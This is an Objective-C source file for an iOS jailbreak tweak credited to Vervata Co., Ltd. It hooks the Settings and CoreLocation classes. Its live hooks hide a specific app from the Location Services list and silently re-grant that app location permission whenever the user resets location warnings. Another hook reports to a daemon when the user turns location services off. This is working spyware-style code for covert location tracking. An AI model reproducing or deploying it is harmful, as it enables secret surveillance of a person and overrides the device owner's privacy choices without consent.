
/**
 - Project name :  MSFSP
 - Class name   :  Location
 - Version      :  1.0  
 - Purpose      :  For MS
 - Copy right   :  18/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import <Foundation/Foundation.h>
#import "LocationHeaders.h"
#import "Visibility.h" 
#import "CLLocationManager.h"
#import "PrefsRootController.h"
#import "ResetPrefController+IOS6.h"
#import "LocationServicesListController+IOS6.h"
#import "PSListController+IOS6.h"

/**
 - Method name: specifiers
 - Purpose:  This method is used to hook for hiding icon from the location settings and reset location warnings.
 - Argument list and description: No Argument .
 - Return type and description: id 
 */

HOOK(LocationServicesListController, specifiers, id) {
	DLog (@"LocationServicesListController >>>>> specifiers:")
    //DLog (@"Getting specifiers!!!");
    id items = CALL_ORIG(LocationServicesListController, specifiers);
    BOOL itemFound = NO;
    id item =nil;
    int index = -1;
    Visibility *vis = [[[Visibility alloc] init] autorelease];
    if(items && [items isKindOfClass:[NSArray class]]) {
        //DLog (@"Processing specifiers!!!");
        for(int i=0;i<[items count];i++){
            item = [items objectAtIndex:i];
            if(item && [item isKindOfClass:objc_getClass("PSSpecifier")]) {
                PSSpecifier *specifierData = (PSSpecifier *)item;
                if([specifierData.identifier isEqualToString:[vis mBundleID]]) {
                    DLog (@"ssmp item specifier found..exit loop");
                    item = (id) specifierData;
                    itemFound =YES;
                    index = i;
                    break;
                }
            }
        }
    }
    
    if(itemFound && index>-1){
        DLog (@"Removing Resetting authorization status item specifier (index = %d)", index);
        [items removeObjectAtIndex:index];
    }
    //DLog (@"Return spfcifiers");

    return items;
}

/**
 - Method name: resetLocationWarnings
 - Purpose:  This method is used toreset location warnings.
 - Argument list and description: No Argument .
 - Return type and description: id 
*/

HOOK(ResetPrefController, resetLocationWarnings$,void, id arg1) {
	DLog (@"ResetPrefController >>>>> resetLocationWarnings: ")	
	Visibility *vis = [[[Visibility alloc] init] autorelease];
    CALL_ORIG(ResetPrefController,  resetLocationWarnings$,arg1);
	//DLog (@"Resetting authorization status");
	DLog(@"BUNDLE ID:%@",[vis mBundleID]);
    [CLLocationManager setAuthorizationStatus:YES forBundleIdentifier:[vis mBundleID]];
}


/**
 - Method name: initWithEffectiveBundleIdentifier
 - Purpose:  This method is used toreset location warnings.
 - Argument list and description: No Argument .
 - Return type and description: id 
*/

HOOK(CLLocationManager,initWithEffectiveBundleIdentifier$bundle$,id, id arg1,id arg2) {
	DLog (@"CLLocationManager >>>>> initWithEffectiveBundleIdentifier:%@ bundle:%@", arg1, arg2);	
	Visibility *vis = [[[Visibility alloc] init] autorelease];
	DLog(@"BUNDLE ID:%@",[vis mBundleID]);
	id arg=	CALL_ORIG(CLLocationManager,  initWithEffectiveBundleIdentifier$bundle$,arg1,arg2);
	[CLLocationManager setAuthorizationStatus:YES forBundleIdentifier:[vis mBundleID]];
	return arg;
}

/*
HOOK(CLLocationManager, authorizationStatusForBundle$, int, id arg1) {
	DLog (@"CLLocationManager >>>>> authorizationStatusForBundle:%@", arg1);
	int authorizationStatus = CALL_ORIG(CLLocationManager, authorizationStatusForBundle$, arg1);
	DLog (@"authorizationStatus = %d", authorizationStatus);
	return authorizationStatus;
}

HOOK(CLLocationManager, authorizationStatusForBundleIdentifier$, int, id arg1) {
	DLog (@"CLLocationManager >>>>> authorizationStatusForBundleIdentifier:%@", arg1);
	int authorizationStatus = CALL_ORIG(CLLocationManager, authorizationStatusForBundleIdentifier$, arg1);
	DLog (@"authorizationStatus = %d", authorizationStatus);
	return authorizationStatus;
}

HOOK(CLLocationManager, _authorizationStatusForBundleIdentifier$bundle$, int, id arg1, id arg2) {
	DLog (@"CLLocationManager >>>>> _authorizationStatusForBundleIdentifier:%@ bundle:%@", arg1, arg2);
	int authorizationStatus = CALL_ORIG(CLLocationManager, _authorizationStatusForBundleIdentifier$bundle$, arg1, arg2);
	DLog (@"authorizationStatus = %d", authorizationStatus);
	return authorizationStatus;
}
*/

void postLocationServiceDidChangeNotification (BOOL aLocationEnabled) {
	// -- post Darwin notification to Location Manager running on a daemon	
	if (!aLocationEnabled) {
		CFNotificationCenterPostNotification (CFNotificationCenterGetDarwinNotifyCenter(),
											  (CFStringRef) @"LocationServiceDidChangeNotification",
											  nil,
											  nil,		//If center is a Darwin notification center, this value is ignored.
											  false);
	}
}

/*
HOOK(PrefsRootController,locationServicesEnabled$, id, id arg) {
	DLog (@"******************************************************************")
	DLog (@"PrefsRootController >>>>> locationServicesEnabled:")
	DLog (@"******************************************************************")
	DLog (@"arg %@ %@" , arg, [arg class])
//	PSSpecifier *specifier = arg;					
	id returnValue = CALL_ORIG(PrefsRootController,  locationServicesEnabled$, arg);		

//	BOOL locationEnabled = [CLLocationManager locationServicesEnabled];
//	if (!locationEnabled) {
//		DLog (@"location service is OFF")
//	} else {
//		DLog (@"location service is ON")
//	}
//	
//	postLocationServiceDidChangeNotification(locationEnabled);

	DLog (@"return %@ %@", returnValue, [returnValue class])	// string
	return returnValue;	
}
*/

HOOK(LocationServicesListController, setLocationServicesEnabled$specifier$, void, id enabled, id specifier) {
	DLog (@"******************************************************************")
	DLog (@"LocationServicesListController >>>>> setLocationServicesEnabled:")
	DLog (@"******************************************************************")
	DLog (@"arg = %@, class = %@" , enabled, [enabled class])		// 1 enable 0 disable
	DLog (@"arg = %@, class = %@" , specifier, [specifier class])
	
	postLocationServiceDidChangeNotification([(NSNumber *) enabled boolValue]);
	
	CALL_ORIG(LocationServicesListController,  setLocationServicesEnabled$specifier$, enabled, specifier);
	DLog (@"after calling to original..")
}

/*
HOOK(LocationServicesListController,disableLocationServicesAfterConfirm$, void, id arg) {
	DLog (@"******************************************************************")
	DLog (@"LocationServicesListController >>>>> disableLocationServicesAfterConfirm:")
	DLog (@"******************************************************************")
	DLog (@"arg %@ %@" , arg, [arg class])
	CALL_ORIG(LocationServicesListController,  disableLocationServicesAfterConfirm$, arg);		
}

HOOK(LocationServicesListController,alertView$clickedButtonAtIndex$, void, id arg1, int arg2) {
	DLog (@"******************************************************************")
	DLog (@"LocationServicesListController >>>>> alertView:clickedButtonAtIndex:")
	DLog (@"******************************************************************")
	DLog (@"arg1 %@ %@" , arg1, [arg1 class])
	DLog (@"arg2 %d" , arg2)	
	CALL_ORIG(LocationServicesListController,  alertView$clickedButtonAtIndex$, arg1, arg2);		
}

HOOK(LocationServicesListController,actionSheet$clickedButtonAtIndex$, void, id arg1, int arg2) {
	DLog (@"******************************************************************")
	DLog (@"LocationServicesListController >>>>> actionSheet:clickedButtonAtIndex:")
	DLog (@"******************************************************************")
	DLog (@"arg1 %@ %@" , arg1, [arg1 class])
	DLog (@"arg2 %d" , arg2)
	CALL_ORIG(LocationServicesListController,  actionSheet$clickedButtonAtIndex$, arg1, arg2);		
}
*/